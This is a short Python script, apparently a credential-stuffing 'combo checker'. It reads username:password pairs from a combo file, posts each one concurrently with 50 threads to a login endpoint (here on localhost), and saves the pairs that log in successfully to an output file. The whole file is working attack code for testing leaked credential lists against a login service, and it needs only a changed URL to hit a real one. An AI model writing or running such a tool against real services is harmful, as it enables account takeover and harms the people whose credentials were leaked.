import requests
import tokenize
import concurrent.futures


def getCombo(inputFile, outFile):

    tempFile = tokenize.open(inputFile)
    fileEncoding = tempFile.encoding
    tempFile.close()
    with open(inputFile, 'r', encoding=fileEncoding, errors="backslashreplace") as f:
            for linea in f:
                (user, password) = linea.replace("\r", "").replace("\n", "").split(":")
                payload = {'user': user,
                           'pass': password}
                yield (payload,outFile)


def checkCombo(payloadAndOutFile):
    (payload, outFile) = payloadAndOutFile
    respuesta = requests.post('http://localhost:5002/validateLogin', data=payload)
    if respuesta.status_code == 200:
        print(payload['user'], payload['pass'])
        outFile.write(payload['user']+":"+payload['pass']+"\n")


if __name__ == '__main__':
    inputFile = 'combo.txt'
    outputFile = 'outputMulti.txt'
    with open(outputFile, 'w') as outFile:
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(checkCombo, getCombo(inputFile, outFile))
